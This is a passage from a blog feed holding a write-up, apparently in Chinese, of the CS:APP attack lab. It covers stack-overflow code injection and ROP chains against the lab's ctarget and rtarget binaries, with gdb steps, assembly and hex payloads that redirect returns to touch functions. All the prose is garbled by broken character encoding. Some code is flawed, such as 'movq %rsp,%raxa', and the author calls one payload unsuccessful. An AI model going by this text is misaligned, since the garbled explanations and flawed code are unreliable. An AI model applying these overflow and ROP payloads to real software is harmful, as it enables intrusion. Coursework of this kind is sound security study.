&lt;attackraw4.txt</code>å°±å¯ä»¥äº†ï¼Œæ²¡æƒ³åˆ°åªè¾“å…¥ä¸€æ¬¡ï¼Œå°±æ˜¯è¯´æ¯æ¬¡éƒ½åªæœ‰ç¬¬ä¸€ä¸ªæ˜¯å¯¹çš„ï¼Œä¸€å®šè¦æ¢è¿™ç§å‘½ä»¤æ‰å¯ä»¥å°†å­—ç¬¦ä¸²å¤åˆ¶äº”æ¬¡è¾“å…¥çš„ï¼Œè¸©è¿‡çš„å‘åƒä¸‡åˆ«è¸©ï¼Œå¦åˆ™åæœå°±æ˜¯ç½šåä¸‰å°æ—¶ï¼Œè®©å¤§å®¶åº·åº·æˆ‘çš„æ’’èŠ±å§ï¼ï¼ï¼</p><p><img src="https://i.loli.net/2021/04/30/oaBdniV29RuOLN4.png" alt="buflab_level4_4.png"></p><p>æœ¬ä½œè€…åœ¨å†™wpçš„æ—¶å€™å–œæ¬¢åŠ ä¸Šè‡ªå·±çš„æ€è€ƒï¼Œå› ä¸ºæˆ‘ä¹Ÿæ˜¯æ–°æ‰‹ï¼Œè¿™ç¯‡wpå¯¹æ–°æ‰‹å°±æ¯”è¾ƒå‹å¥½ï¼Œå› ä¸ºå¤§æ¦‚ç‡æ˜¯å¯ä»¥è¸©åˆ°ç›®å‰æ–°æ‰‹èƒ½è¸©åˆ°çš„å¤§éƒ¨åˆ†å‘çš„ï¼Œå¦‚æœå“ªé‡Œè¯´çš„ä¸å¯¹ï¼Œæ³è¯·æŒ‡æ­£ï¼</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>attacklabå®éªŒæŠ¥å‘Š:ä»£ç æ³¨å…¥ä»¥åŠropæ”»å‡»</title>
      <link href="/2021/04/25/attqacklab/"/>
      <url>/2021/04/25/attqacklab/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©æ¥åº·åº·attack labå•Š</p><span id="more"></span><h2 id="Ctarget"><a href="#Ctarget" class="headerlink" title="Ctarget"></a>Ctarget</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>é¢˜ç›®ç»™å‡ºå‡½æ•°<code>test</code>ï¼Œ<code>test</code>é‡Œé¢æœ‰å‡½æ•°<code>getbuf</code>ï¼Œç„¶åå®ƒç»™å®šçš„ææƒå‡½æ•°æ˜¯<code>touch1()</code>ï¼Œæˆ‘ä»¬é‚£æˆ‘ä»¬å…ˆ<code>gdb ctarget</code>è¿›å…¥è°ƒè¯•ï¼Œç„¶åè¾“å…¥<code>disassemble getbuf</code>æŸ¥çœ‹æ±‡ç¼–ä»£ç ã€‚</p><p><img src="https://i.loli.net/2021/04/26/4rX8hQMRAoB9g6k.png" alt="attacklab_Ctarget_level1_1.png"></p><p>å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°å‡½æ•°çš„ç¼“å†²åŒºå¤§å°æ˜¯<code>0x28</code>å­—èŠ‚ï¼Œç„¶å<code>gets</code>å·²ç»è¯´æ˜æ˜¯åº“çš„æ ‡å‡†å‡½æ•°äº†ï¼Œ<code>gets</code>å‡½æ•°æ˜¯æœ‰æ¼æ´çš„ï¼Œå®ƒåœ¨è¯»å…¥å­—ç¬¦ä¸²çš„æ—¶å€™ä¸ä¼šå¯¹é•¿åº¦æ£€æµ‹ï¼Œè€Œæ˜¯ç»™å¤šå°‘è¯»å¤šå°‘ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ª<code>gets</code>æ¥å®ç°æ ˆæº¢å‡ºï¼Œæ‰§è¡Œæˆ‘ä»¬çš„æƒé™å‡½æ•°<code>touch1()</code>ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆç”¨<code>00</code>å­—èŠ‚å¡«å……<code>40</code>ä¸ªå­—èŠ‚ï¼Œç„¶åå†åŠ ä¸Š<code>shell</code>å‡½æ•°çš„åœ°å€ã€‚æ³¨æ„å‰é¢å¯ä»¥ç”¨é™¤äº†<code>0a</code>çš„ä»»æ„å­—èŠ‚å¡«å……ï¼Œå› ä¸º<code>0a</code>ä»£è¡¨<code>â€™\nâ€™</code>çš„æ„æ€ï¼Œ<code>gets</code>å‡½æ•°ä¸€æ—¦è¯»åˆ°è¿™ä¸ªå­—ç¬¦å°±ä¼šè®¤ä¸ºå­—ç¬¦ä¸²è¯»å–ç»“æŸäº†ã€‚æˆ‘ä»¬ç”¨<code>print touch1</code>å»æŸ¥çœ‹è¯¥å‡½æ•°çš„åœ°å€ã€‚</p><p><img src="https://i.loli.net/2021/04/26/tsoDagXldAT5NYC.png" alt="attacklab_ctarget_level1_2.png"></p><p>å‘ç°äº†ææƒå‡½æ•°çš„åœ°å€ä¹‹åæˆ‘ä»¬å°±å¯ä»¥æ„é€ <code>payload</code>äº†ã€‚æˆ‘ä»¬å…ˆ<code>q</code>é€€å‡º<code>gdb</code>ï¼Œç„¶åè¿™é‡Œå…ˆåˆ›å»ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶<code>vim attack1.txt</code> ç„¶åå¡«å……</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œåœ°å€åœ¨è®¡ç®—æœºé‡Œæ˜¯<strong>å°ç«¯åº</strong>å­˜å‚¨ã€‚ä¹Ÿå°±æ˜¯<strong>é«˜åœ°å€å­˜å‚¨é«˜ä½å­—èŠ‚</strong>ï¼Œç„¶åæˆ‘ä»¬æ„é€ çš„<code>payload</code>æ˜¯å¾€<strong>æ ˆåº•æ–¹å‘</strong>å¡«å……çš„ï¼Œè€Œæ ˆåˆæ˜¯<strong>å‘ä½åœ°å€å¢é•¿</strong>çš„ï¼Œå› æ­¤å¦‚æ­¤åè½¬è¿‡åæˆ‘ä»¬çš„å‡½æ•°åœ°å€è¦æŒ‰å­—èŠ‚å€’ç€å¡«å……ã€‚ç„¶åæ ¹æ®å­—èŠ‚ç”Ÿæˆå­—ç¬¦ä¸²æ–‡ä»¶ã€‚</p><p>è¿è¡Œé¢˜ç›®ç»™çš„<code>hex2raw</code>æ–‡ä»¶ï¼Œ<code>./hex2raw &lt;source file&gt; target file</code>å‘½ä»¤å»ç”Ÿæˆç›®æ ‡æ–‡ä»¶ã€‚ç„¶åå†<code>./ctarget -q -i target file</code>è¿™é‡Œæˆ‘ç”Ÿæˆçš„æ–‡ä»¶åå«<code>attackraw1.txt</code>ï¼Œç„¶åç»ˆç«¯è¾“å…¥è¿è¡Œå‘½ä»¤ï¼Œå‘ç°æ”»å‡»æˆåŠŸäº†ã€‚</p><p><img src="https://i.loli.net/2021/04/26/vY3tahzlkjQudCZ.png" alt="attacklab_ctarget_level1_3.png"></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>è¿™ä¸ªéœ€è¦æ”»å‡»æ‰§è¡Œçš„å‡½æ•°åä¸º<code>touch2()</code>ï¼Œè¿™ä¸ªæ ˆæº¢å‡ºçš„æ¼æ´ä¾ç„¶å¯ä»¥åˆ©ç”¨ã€‚ä½†æ˜¯<code>print touch2</code>ä¹‹åä½ å°±ä¼šå‘ç°ï¼Œ<code>touch2</code>æ¯”<code>touch1</code>å¤šäº†ä¸€ä¸ªå‚æ•°ã€‚æ•…æŠ€é‡æ–½ä¹‹åå‘ç°ï¼š</p><p><img src="https://i.loli.net/2021/04/26/LAOwMRtHp97zThr.png" alt="attacklab_ctarget_level2_1.png"></p><p>è™½ç„¶æˆ‘ä»¬æˆåŠŸæ‰§è¡Œäº†<code>touch2()</code>å‡½æ•°ï¼Œä½†æ˜¯è¿˜æ˜¯å¤±è´¥äº†ï¼Œå‘ç°<code>touch2()</code>äº‹å®ä¸Šé‚£ä¸ªå‚æ•°æ˜¯ç”¨æ¥æ£€æµ‹æ˜¯å¦ä¸<code>cookie</code>åŒ¹é…çš„ï¼Œè€Œ<code>cookie</code>çš„å€¼å·²ç»å‘Šè¯‰ä½ äº†ã€‚åœ¨32ä½çš„ç¨‹åºé‡Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥å¾€è¿”å›åœ°å€åé¢å†™ä¸Š<code>cookie</code>ä½œä¸ºå‚æ•°ï¼Œä½†æ˜¯64ä½ç¨‹åºå‰6ä¸ªå‚æ•°é‡‡ç”¨å¯„å­˜å™¨ä¼ å‚ï¼Œé‚£ä¹ˆè¦æˆåŠŸæ”»å‡»å°±å¿…é¡»ä¿®æ”¹<code>rdi</code>å¯„å­˜å™¨çš„å€¼ä¸º<code>cookie</code>ã€‚å› ä¸ºæˆ‘ä»¬ç›´æ¥åœ¨è¿”å›ä½ç½®è¦†ç›–å‡½æ•°åœ°å€ï¼Œè·Ÿæ™®é€šè°ƒç”¨çš„åŒºåˆ«å°±å°‘äº†å‚æ•°çš„ä¼ é€’ï¼Œæ‰€ä»¥rdiçš„å€¼è‡³å°‘åœ¨æ‰§è¡Œgetbufå‡½æ•°çš„æ—¶å€™ä¸ä¼šçœ‹éï¼Œè¿™é‡Œæœ‰40å­—èŠ‚å¤§å°çš„æ ˆç©ºé—´ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¾€æ ˆä¸­æ³¨å…¥ä»£ç ï¼Œä»£ç åº”è¯¥æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi</span><br><span class="line"></span><br><span class="line">call $touch2</span><br></pre></td></tr></table></figure><p><code>call</code>å‘½ä»¤çš„æ“ä½œæ•°æ˜¯æ ¹æ®<code>rip</code>åç§»æ¥çš„ï¼Œé‚£ç¡®å®šä¸äº†è¿™ä¸ªåç§»ï¼Œå°±æ²¡åŠæ³•å‡†ç¡®çš„<code>call</code>åˆ°è¿™ä¸ª<code>touch2()</code>å‡½æ•°ï¼Œé‚£ä¹ˆæ¢ä¸€ä¸ªæ€è·¯ï¼šå…ˆå¾€æ ˆä¸Šå †è¿”å›åœ°å€ï¼Œå†è¿”å›<code>ret</code>å¼¹å‡ºè¿”å›ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨å¾€æ ˆä¸Šæ³¨å…¥ä»£ç å°±æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure><p>å°±å®Œæˆäº†ï¼Œå†åŠ ä¸Šå¡«å……å­—èŠ‚æ€»å…±40å­—èŠ‚å†åœ¨æœ«å°¾è¿”å›æ ˆåœ°å€å°±å¯ä»¥ç›´æ¥æ‰§è¡Œåˆšåˆšæ³¨å…¥çš„ä»£ç äº†ã€‚æˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦ç¡®å®šæ ˆçš„åœ°å€äº†ã€‚<code>gdb ctarget </code>ç„¶ååœ¨<code>getbuf</code>è¿™é‡Œä¸‹æ–­ç‚¹.<code>r -q</code>è¿è¡Œåˆ°<code>sub rsp,0x28</code>è¿™ä¸€æ­¥æˆ‘ä»¬è§‚å¯Ÿæ ˆæŒ‡é’ˆçš„ä½ç½®</p><p><img src="https://i.loli.net/2021/04/26/51MLvTDFXRdAIjK.png" alt="attacklab_ctarget_level2_2.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨è¿”å›åœ°å€çš„ä½ç½®æŒ‡å‘æ ˆä¸­æˆ‘ä»¬å †çš„ä»£ç çš„ä½ç½®ï¼Œè®©å®ƒæ‰§è¡Œè¿™äº›æŒ‡ä»¤ï¼Œä»¥æ­¤è¾¾åˆ°ä¼ å‚ä¸”æ‰§è¡Œå‡½æ•°çš„ç›®çš„ã€‚ä¾ç„¶è¦æ³¨æ„å°ç«¯é—®é¢˜ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦è§£å†³ä¸€ä¸ªé—®é¢˜ï¼šå¦‚ä½•æŠŠæ±‡ç¼–ä»£ç è½¬æ¢ä¸ºå­—èŠ‚ç ï¼Ÿ</p><p>å…ˆ<code>vim 1.s</code>ï¼Œå¡«å…¥æ±‡ç¼–ä»£ç ï¼Œç„¶å<code>gcc -c 1.s -o 1.o</code>æ±‡ç¼–ä¹‹åï¼Œå†<code>objdump -d 1.o</code>åæ±‡ç¼–å°±å¯ä»¥æŸ¥çœ‹æ±‡ç¼–ä»£ç çš„å­—èŠ‚ç äº†ã€‚</p><p><img src="https://i.loli.net/2021/04/26/b7dpJR2DMv8N3k5.png" alt="attacklab_ctarget_level2_4.png"></p><p>æ˜“å¾—<code>payload</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œæ”»å‡»æˆåŠŸäº†ã€‚</p><p><img src="https://i.loli.net/2021/04/26/mbuiMhVOGQY2Tca.png" alt="attacklab_ctarget_level2_3.png"></p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>è¿™é‡Œçš„ææƒå‡½æ•°æ˜¯<code>touch3</code>ï¼Œ<code>writeup</code>ä¸­å·²ç»ç»™äº†æˆ‘ä»¬å‡½æ•°çš„è¯­å¥(Ps:æˆ‘åšåˆ°è¿™é‡Œæ‰çŸ¥é“writeupæ˜¯è¯´æ˜çš„æ„æ€qwq)ã€‚</p><p><img src="https://i.loli.net/2021/04/26/R37sHQJ1e5FWf2n.png" alt="attacklab_Ctarget_level3_1.png"></p><p>è¦æ±‚<code>hexmatch</code>å‡½æ•°è¿”å›<code>true</code>ï¼Œè¿™æ¬¡æ”»å‡»æ‰èƒ½æˆåŠŸï¼Œé¢˜ç›®ä¹Ÿç»™äº†æˆ‘ä»¬è¿™ä¸ªå‡½æ•°çš„è¯­å¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall hexmatch(unsigned int val, char *sval)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v2; // rbx</span><br><span class="line">  char cbuf[110]; // [rsp+0h] [rbp-98h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+78h] [rbp-20h]</span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  v2 = &amp;cbuf[random() % 100];</span><br><span class="line">  __sprintf_chk(v2, 1LL, -1LL, &quot;%.8x&quot;, val);</span><br><span class="line">  return strncmp(sval, v2, 9uLL) == 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¸¤ä¸ªè¾“å…¥ï¼Œä¸€ä¸ªå°±æ˜¯<code>val</code>ï¼Œé‚£ä¹ˆå®å‚å°±æ˜¯<code>cookie</code>çš„å€¼ï¼Œå·²ç»ç¡®å®šäº†æ”¹ä¸äº†äº†ï¼Œ<code>sval</code>å‚æ•°æ˜¯<code>touch3()</code>åŸå‚æ•°ç»™çš„ï¼Œå› æ­¤æˆ‘ä»¬åœ¨<code>call touch3</code>çš„æ—¶å€™ç»™<code>rdi</code>ä¼ çš„å‚æ•°å°±å¯ä»¥æ˜¯<code>hexmatch</code>çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚ä¸­é—´æœ‰ä¸€æ­¥æ˜¯å¾æ™ƒä¸€æªï¼Œé‚£å°±æ˜¯è¿™ä¸ªéšæœºå‡½æ•°äº†ï¼Œä½†æ˜¯æ¥ä¸‹æ¥æœ‰ä¸€ä¸ª<code>sprintf</code>å‡½æ•°ï¼Œ<code>sprintf</code>å‡½æ•°æ˜¯å°†æ ¼å¼åŒ–å­—ç¬¦ä¸²è¾“å‡ºç»™<code>s</code>ã€‚é‚£ä¹ˆæŠŠ<code>val</code>ä»¥<code>8</code>ä½åå…­è¿›åˆ¶æ•°ç»™<code>s</code>çš„æ„æ€å°±æ˜¯<code>s=&quot;59b997fa&quot;</code>,æ‰€ä»¥<code>s</code>å­—ç¬¦ä¸²çœ‹ä¼¼éšæœºå®åˆ™å›ºå®šçš„ã€‚å­—ç¬¦ä¸²ä¼ å‚æ˜¯ä¼ å­—ç¬¦ä¸²é¦–å­—ç¬¦çš„<code>char</code>æŒ‡é’ˆï¼Œæ•°å€¼ä¸ºé¦–å­—ç¬¦åˆ°<code>â€™\0â€™</code>ä¹‹é—´çš„æ‰€æœ‰å­—ç¬¦ï¼ˆå¤§ç«¯åºï¼‰ã€‚é‚£ä¹ˆæˆ‘ä»¬æ„é€ çš„<code>sval</code>å­—ç¬¦ä¸²çš„å­—èŠ‚ç å°±è¦åº”è¯¥æ˜¯ï¼š<code>35 39 62 39 39 37 66 61</code>ï¼ŒçŸ¥é“äº†è¦æ„é€ çš„å­—ç¬¦ä¸²ä¹‹åè¿˜è¦æƒ³åŠæ³•å°†å®ƒä½œä¸ºå‚æ•°ä¼ åˆ°<code>rdi</code>é‡Œé¢ã€‚æˆ‘ä»¬å¯ä»¥å°†å®ƒä¿å­˜åˆ°æ ˆä¸­çš„æŸä¸ªä½ç½®ï¼Œå› ä¸ºåœ¨è°ƒç”¨å‡½æ•°çš„æ—¶å€™<code>getbuf</code>æ ˆå¸§çš„éƒ¨åˆ†å¯èƒ½ä¼šå› ä¸ºæ­£å¸¸è°ƒç”¨<code>hexmatch</code>å‡½æ•°è¢«ç ´åï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç¼“å†²åŒºä¸‹<code>4</code>ä¸ªå­—èŠ‚å¡«å……æ‰€éœ€çš„å­—ç¬¦ä¸²ï¼Œå°±ç®—ç ´åå…¶å®ƒæ ˆå¸§ä¹Ÿæ²¡æœ‰å…³ç³»ï¼Œåªè¦èƒ½æ‰§è¡Œå°±<code>ok</code>ã€‚é‚£ä¹ˆå¾ˆå®¹æ˜“æ„é€ <code>payload</code>ï¼šåœ¨è¿™é‡Œè¦æ³¨å…¥çš„ä»£ç è·ŸåŸæ¥å·®ä¸å¤šï¼Œåªæ˜¯å‚æ•°è¦å˜æˆ<code>cookie</code>å­—ç¬¦ä¸²çš„é¦–åœ°å€ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68 </span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61 </span><br><span class="line">00</span><br></pre></td></tr></table></figure><p>æ³¨æ„æœ€åä¸€ä½è¦<code>00</code> å¡«å……ï¼Œå› ä¸ºå­—ç¬¦ä¸²æ˜¯è¦åˆ°<code>00</code>æ‰ç»“æŸçš„ï¼Œå¦‚æœä¸æ˜¯é‚£ä¹ˆå°±ä¼šä¸€ç›´è¿›è¡Œä¸‹å»ã€‚</p><h2 id="rtarget"><a href="#rtarget" class="headerlink" title="rtarget"></a>rtarget</h2><h3 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h3><p>è¿™ä¸ªå®˜æ–¹çš„<code>writeup</code>å·²ç»æ˜ç¡®è¯´äº†ï¼Œæ ˆåªè¯»ï¼Œå› æ­¤å¾—é‡‡å–<code>rop</code>çš„æ–¹å¼å–æ”»å‡»æ‰§è¡Œ<code>touch2()</code>ã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨<code>objdump -d rtarget</code>å»æŸ¥çœ‹ä»£ç ç¢ç‰‡çœ‹çœ‹å“ªé‡Œå¯ä»¥åˆ©ç”¨ã€‚é¦–å…ˆæˆ‘ä»¬æƒ³çš„åº”è¯¥æ˜¯ï¼Œ<code>movq $0x59b997fa,%rdi</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å‘ç°ä½ æ ¹æœ¬æ‰¾ä¸åˆ°<code>movq $0x59b997fa,%rdi</code>ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•ç•¥æ‰ã€‚</p><p>é‚£è¿˜æœ‰<code>plan B</code>ï¼šåœ¨æ ˆä¸Š<code>rsp</code>é‡Œé¢è£…å…¥é‚£ä¸ªæ•°ç„¶å<code>popq</code>å¼¹åˆ°<code>rdi</code>é‡Œé¢å°±å¥½äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æƒ³çš„å°±æ˜¯ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æœç´¢ä¸€ä¸‹<code>popq %rdi </code>çš„å­—èŠ‚ç <code>5f</code>ï¼Œå‘ç°<code>0x40233a</code>æœ‰ä¸€ä¸ª5fçš„</p><p>é‚£å°±å¾ˆå®¹æ˜“æ„é€ <code>payload</code>äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">3a 23 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/26/kCrAciSvRxqJgWs.png" alt="attacklab_rtarget_level2_1.png"></p><p>äº‹å®ä¸Šè¿™é‡Œæˆ‘æ˜¯æ²¡æœ‰æ”»å‡»æˆåŠŸçš„ï¼Œæˆ‘è§‰å¾—ä»é€»è¾‘ä¸Šæ¥è®²æ˜¯æ²¡æœ‰ä»»ä½•é—®é¢˜çš„ï¼Œæœ‰å¤§ä½¬çœ‹åˆ°è’Ÿè’»çš„å°é”™è¯¯æ³è¯·å¸®å¿™æŒ‡æ­£ã€‚é‚£ä¹ˆæ­£ç¡®çš„åšæ³•æ˜¯å…ˆæŠŠå®ƒpopåˆ°raxå¯„å­˜å™¨é‡Œé¢ï¼Œç„¶åæ‰§è¡Œ<code>movq %rax,%rdi</code>ç„¶åå†<code>ret touch3()</code>ï¼Ÿï¼Ÿï¼Ÿåˆ°åº•æœ‰å•¥åŒºåˆ«å˜›ï¼Œè¿˜æ˜¯æä¸æ‡‚ã€‚ã€‚</p><p>é‚£ä¹ˆä»£ç å°±æ˜¯:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>æ„é€ å‡ºæ¥çš„payloadå°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåº”è¯¥ä¸éš¾ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æƒ³çŸ¥é“æˆ‘çš„å“ªé‡Œæœ‰é—®é¢˜ï¼ï¼ï¼</p><h3 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h3><p>é¦–å…ˆæƒ³æƒ³æˆ‘ä»¬è¦å¹²å˜›ï¼Ÿæ„é€ åœ¨ä¸€ä¸ªç‰¹æ®Šçš„åœ°æ–¹æ„é€ å­—ç¬¦ä¸²ç„¶åæŠŠå­—ç¬¦ä¸²å­—ç¬¦é¦–åœ°å€ä¼ ç»™<code>rdi</code>å°±èƒ½ç›´æ¥æ”»å‡»æˆåŠŸã€‚å¼€å¯äº†æ ˆåªè¯»å’Œåœ°å€éšæœºåŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿˜æ˜¯åªèƒ½é€šè¿‡æ ˆå»æº¢å‡ºï¼Œè‚¯å®šæ˜¯è¦å…ˆæŠŠå­—ç¬¦ä¸²å†™åœ¨åé¢ï¼Œä¸­é—´å…¨æ˜¯<code>gadget</code>ã€‚ç„¶åé€šè¿‡ç¡®å®š<code>rsp</code>çš„å€¼ä»¥åŠæˆ‘ä»¬å·²æ„é€ çš„<code>gadget</code>ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾ˆè½»æ¾åœ°è·å¾—å­—ç¬¦ä¸²åœ°å€ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬éœ€è¦çš„æ±‡ç¼–ä»£ç å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//movq %rsp,%rdi</span><br><span class="line">movq %rsp,%raxa</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">add $offset,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦æ˜¯addè¿™æ¡æŒ‡ä»¤ï¼Œåˆ«é—®æˆ‘ä¸ºä»€ä¹ˆåˆšæ‰çš„æ€è·¯æ‰“æ–­äº†ï¼Œéƒ½æ˜¯ä¸Šé¢é‚£ä¸ª<code>level2</code>æå¾—ï¼Œå°±ä½›ç³»ä¸€ç‚¹æŠŠï¼Œå…ˆæŠŠå®ƒä¼ ç»™<code>rax</code>å†ç»™<code>rdi</code>ä¹Ÿä¸€æ ·çš„ï¼Œå³ä½¿æˆ‘ä¸çŸ¥é“ä¸€æ­¥åˆ°ä½ä¸ºä»€ä¹ˆä¸è¡Œã€‚æ¥ä¸‹æ¥æ˜¯å¯»æ‰¾<code>gadget</code>äº†ã€‚å…¶å®ƒçš„éƒ½èƒ½å¾ˆå¥½æ‰¾åˆ°ï¼Œå”¯ç‹¬<code>add</code>è¿™æ¡æŒ‡ä»¤ä¸å¥½æï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å¤§è‡´çœ‹ä¸€ä¸‹è§„å¾‹ã€‚</p><p><img src="https://i.loli.net/2021/04/26/Sl1a8dpCuFRA7jO.png" alt="attacklab_rtarget_level3_1.png"></p><p>æˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ™°åœ°å‘ç°ï¼Œ<code>add $xxx,%rdi</code>çš„ä¸€èˆ¬è§„å¾‹å°±æ˜¯ <code>48 83 c7</code> ç„¶ååé¢ä¸€ä¸ªå­—èŠ‚ç¡®å®šç«‹å³æ•°çš„å¤§å°é‚£ä¹ˆå°±å»æœç´¢ä¸€ä¸‹<code>48 83 c7</code>ï¼Œä½†æ˜¯å¾ˆå¿«å°±ä¼šå‘ç°ï¼Œæœä¸åˆ°è¿™ä¸ª<code>gadget</code>ã€‚é‚£ä¹ˆæ¢ä¸€ç§æ€è·¯ï¼Œæ—¢ç„¶æˆ‘ä»¬å…ˆä¼ ç»™äº†<code>rax</code>é‚£æˆ‘ä»¬å¯ä»¥å…ˆè®©<code>rax</code>åŠ ä¸Šé‚£ä¸ªå€¼å•Šã€‚è¯´å¹²å°±å¹²ï¼Œæ±‡ç¼–å†åä¹‹åå¾—åˆ°å­—èŠ‚ç 